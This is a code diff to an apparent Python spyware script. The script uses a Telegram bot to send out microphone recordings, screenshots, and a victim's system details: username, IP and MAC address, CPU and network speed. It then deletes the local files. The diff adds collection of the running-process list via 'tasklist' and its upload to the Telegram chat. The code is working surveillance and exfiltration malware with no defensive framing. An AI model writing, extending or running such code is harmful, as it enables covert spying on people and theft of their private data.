@@ -13,15 +13,17 @@ import telebot
 import pyaudio
 import wave
 from PIL import Image
+from subprocess import Popen, PIPE
 
 bot = telebot.TeleBot("token_your_bot")
+process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
 chunk = 1024
 formats = pyaudio.paInt16
 channels = 2
 rate = 44100
 second = 0
 os.getcwd()
-os.chdir(r"Direct_save")
+os.chdir(r"Direct_save ")
 names = "sound.wav"
 p = pyaudio.PyAudio()
 stream = p.open(format=formats,
@@ -64,7 +66,7 @@ time = datetime.fromtimestamp(zone)
 cpu = psutil.cpu_freq()
 os.getcwd()
 try:
-    os.chdir(r" ")
+    os.chdir(r"Direct_save ")
 except OSError:
     @bot.message_handler(commands=['start'])
     def start_message(message):
@@ -77,7 +79,7 @@ ends = datetime.now()
 workspeed = format(ends - start)
 os.getcwd()
 try:
-    os.chdir(r" ")
+    os.chdir("Direct_save ")
 except OSError:
     @bot.message_handler(commands=['start'])
     def start_message(message):
@@ -88,20 +90,27 @@ except OSError:
 file = open("info.txt", "w")
 file.write(f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
 file.close()
+ride = open("process.txt", "w", encoding="utf-8")
+ride.write(' '.join(process))
+ride.close()
 text = "Screenshot"
 @bot.message_handler(commands=["start"])
 def start_message(message):
-    upaudio = open("\sound.wav", "rb")
-    upfile = open("\info.txt", "rb")
-    uphoto = open("\screenshot.jpg", "rb")
+    upaudio = open("Direct_save\sound.wav", "rb")
+    upfile = open("Direct_save\info.txt", "rb")
+    uphoto = open("Direct_save\screenshot.jpg", "rb")
+    upprocess = open("Direct_save\process.txt", "rb")
     bot.send_photo(message.chat.id, uphoto, text)
     bot.send_document(message.chat.id, upfile)
+    bot.send_document(message.chat.id, upprocess)
     bot.send_voice(message.chat.id, upaudio)
     upfile.close()
+    upprocess.close()
     uphoto.close()
     upaudio.close()
 
     os.remove("info.txt")
+    os.remove("process.txt")
     os.remove("screenshot.jpg")
     os.remove("sound.wav")
 
